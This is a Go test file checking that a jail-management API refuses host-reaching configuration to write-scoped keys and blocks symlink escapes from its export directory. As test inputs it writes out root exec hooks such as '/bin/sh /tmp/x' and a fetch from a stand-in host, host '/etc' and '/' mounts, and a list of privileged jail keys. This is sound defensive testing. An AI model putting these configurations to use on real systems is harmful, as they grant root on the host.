package api

import (
	"context"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
)

// TestPrivilegedConfigNeedsAdmin covers the escalation a write-scoped key had
// over the host.
//
// Creating an instance needs "write". A jail's provider config can carry a
// nullfs mount of any host directory and an exec.start command that jail(8) runs
// as root, so a key holding only "write" could mount /etc read-write and write
// to it. The separate exec and admin permissions exist to keep that authority
// apart, so a construct that reaches the host filesystem needs an admin key.
func TestPrivilegedConfigNeedsAdmin(t *testing.T) {
	privileged := []struct {
		name   string
		config map[string]interface{}
	}{
		{"a command run as root", map[string]interface{}{"exec.start": "/bin/sh /tmp/x"}},
		{"a stop command", map[string]interface{}{"exec.stop": "/bin/sh /tmp/x"}},
		{"the jail root itself", map[string]interface{}{"path": "/"}},
		{"a fstab of the caller's choosing", map[string]interface{}{"mount.fstab": "/tmp/fstab"}},
		{"a mount of a host directory", map[string]interface{}{
			"mounts": []interface{}{
				map[string]interface{}{"host_path": "/etc", "mount_path": "/host"},
			},
		}},
	}

	for _, tt := range privileged {
		t.Run(tt.name+" is refused to a write key", func(t *testing.T) {
			srv := &Server{config: &ServerConfig{}, logger: slog.Default()}
			w := httptest.NewRecorder()
			r := requestWithPermissions([]string{"write"})

			if !srv.refusePrivilegedConfig(w, r, tt.config) {
				t.Fatalf("a write key was allowed to set %v", tt.config)
			}
			if w.Code != http.StatusForbidden {
				t.Errorf("status = %d, want %d", w.Code, http.StatusForbidden)
			}
		})

		t.Run(tt.name+" is allowed to an admin key", func(t *testing.T) {
			srv := &Server{config: &ServerConfig{}, logger: slog.Default()}
			w := httptest.NewRecorder()
			r := requestWithPermissions([]string{"admin"})

			if srv.refusePrivilegedConfig(w, r, tt.config) {
				t.Errorf("an admin key was refused %v", tt.config)
			}
		})

		t.Run(tt.name+" is allowed to a wildcard key", func(t *testing.T) {
			srv := &Server{config: &ServerConfig{}, logger: slog.Default()}
			w := httptest.NewRecorder()
			r := requestWithPermissions([]string{"*"})

			if srv.refusePrivilegedConfig(w, r, tt.config) {
				t.Errorf("the default wildcard key was refused %v", tt.config)
			}
		})
	}
}

// TestOrdinaryConfigNeedsNoAdmin keeps the gate off everything that does not
// reach the host: a jail parameter, and a volume with no host_path.
func TestOrdinaryConfigNeedsNoAdmin(t *testing.T) {
	ordinary := []map[string]interface{}{
		{"allow.sysvipc": true, "host.hostname": "db"},
		{"mounts": []interface{}{
			map[string]interface{}{"name": "data", "mount_path": "/data"},
		}},
		{},
		nil,
	}

	for _, config := range ordinary {
		srv := &Server{config: &ServerConfig{}, logger: slog.Default()}
		w := httptest.NewRecorder()
		if srv.refusePrivilegedConfig(w, requestWithPermissions([]string{"write"}), config) {
			t.Errorf("an ordinary config was refused: %v", config)
		}
	}
}

// TestUnauthenticatedDaemonIsNotConstrained covers --allow-no-auth, where no key
// exists at all. That mode is insecure by declaration, and the request has
// already passed the route middleware.
func TestUnauthenticatedDaemonIsNotConstrained(t *testing.T) {
	srv := &Server{config: &ServerConfig{}, logger: slog.Default()}
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, "/api/v1/instances", nil)

	config := map[string]interface{}{"exec.start": "/bin/sh"}
	if srv.refusePrivilegedConfig(w, r, config) {
		t.Error("a daemon running without authentication was constrained")
	}
}

func requestWithPermissions(perms []string) *http.Request {
	r := httptest.NewRequest(http.MethodPost, "/api/v1/instances", nil)
	return r.WithContext(context.WithValue(r.Context(), contextKeyPermissions, perms))
}

// TestFilePathConfinementFollowsSymlinks covers an escape from the export and
// import directory.
//
// Confinement compared filepath.Abs strings, which confines the name and not the
// file: a symlink planted inside the directory points wherever it likes, and the
// daemon reads and writes through it as root.
func TestFilePathConfinementFollowsSymlinks(t *testing.T) {
	base := t.TempDir()
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "secret"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(base, "link")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	escape := filepath.Join(base, "link", "secret")
	if err := validateUserFilePath(escape, base); err == nil {
		t.Errorf("a path leaving %s through a symlink was accepted: %s", base, escape)
	}

	inside := filepath.Join(base, "export.tar")
	if err := validateUserFilePath(inside, base); err != nil {
		t.Errorf("a path inside the directory was refused: %v", err)
	}
}

// TestEveryHostHookIsPrivileged closes the gap the original list left open. It
// named exec.start and exec.stop, while jail(8) runs every other exec.* hook on
// the host just the same.
func TestEveryHostHookIsPrivileged(t *testing.T) {
	privileged := []string{
		"exec.prestart", "exec.poststart", "exec.prestop", "exec.poststop",
		"exec.created", "exec.prepare", "exec.release", "exec.consolelog",
		"exec.system_user", "path", "mount", "mount.fstab", "devfs_ruleset",
		"securelevel", "enforce_statfs", "allow.mount", "allow.mount.zfs", "allow.vmm",
	}
	for _, key := range privileged {
		if !privilegedProviderConfigKey(key) {
			t.Errorf("%s reaches the host but is not treated as privileged", key)
		}
	}

	ordinary := []string{
		"exec.clean", "exec.timeout", "exec.fib", "exec.jail_user",
		"allow.raw_sockets", "allow.sysvipc", "host.hostname", "ip4.addr",
		"children.max", "vnet", "persist",
	}
	for _, key := range ordinary {
		if privilegedProviderConfigKey(key) {
			t.Errorf("%s stays inside the jail but is treated as privileged", key)
		}
	}
}

// TestProviderOwnedHandleKeysAreReserved pins the keys providers read back from
// the handle to locate what they destroy.
func TestProviderOwnedHandleKeysAreReserved(t *testing.T) {
	for _, key := range []string{"zfs_dataset", "vm_dir", "qmp_socket"} {
		found := false
		for _, reserved := range reservedHandleMetadata {
			if reserved == key {
				found = true
			}
		}
		if !found {
			t.Errorf("%s is read back by a provider but not reserved", key)
		}
	}
}

// TestStackDeployEnforcesThePermissionBoundary covers the escalation the stack
// endpoint left open: DeployStack calls the providers directly, so what the
// instances endpoint refuses a write key has to be refused here too — including
// on the shape a manifest produces, not only the shape JSON decoding does.
func TestStackDeployEnforcesThePermissionBoundary(t *testing.T) {
	srv := &Server{config: &ServerConfig{}, logger: slog.Default()}

	privileged := []struct {
		name   string
		config map[string]interface{}
	}{
		{"a hook jail(8) runs on the host", map[string]interface{}{"exec.poststart": "/usr/bin/fetch http://x/k"}},
		{"the jail root itself", map[string]interface{}{"path": "/"}},
		{"a devfs ruleset", map[string]interface{}{"devfs_ruleset": "0"}},
		{"a mount built by the converter", map[string]interface{}{
			// convert.go builds []map[string]interface{}, not the
			// []interface{} a decoded request carries.
			"mounts": []map[string]interface{}{
				{"host_path": "/", "mount_path": "/host"},
			},
		}},
	}

	for _, tt := range privileged {
		t.Run(tt.name+" is refused to a write key", func(t *testing.T) {
			w := httptest.NewRecorder()
			if !srv.refusePrivilegedConfig(w, requestWithPermissions([]string{"write"}), tt.config) {
				t.Fatalf("a write key was allowed to set %v", tt.config)
			}
			if w.Code != http.StatusForbidden {
				t.Errorf("status = %d, want %d", w.Code, http.StatusForbidden)
			}
		})
	}

	t.Run("ordinary configuration still deploys", func(t *testing.T) {
		w := httptest.NewRecorder()
		ordinary := map[string]interface{}{
			"vnet": true,
			"cpu":  "2",
			"mounts": []map[string]interface{}{
				{"name": "data", "mount_path": "/data"},
			},
		}
		if srv.refusePrivilegedConfig(w, requestWithPermissions([]string{"write"}), ordinary) {
			t.Error("a stack that asks for nothing privileged was refused")
		}
	})
}
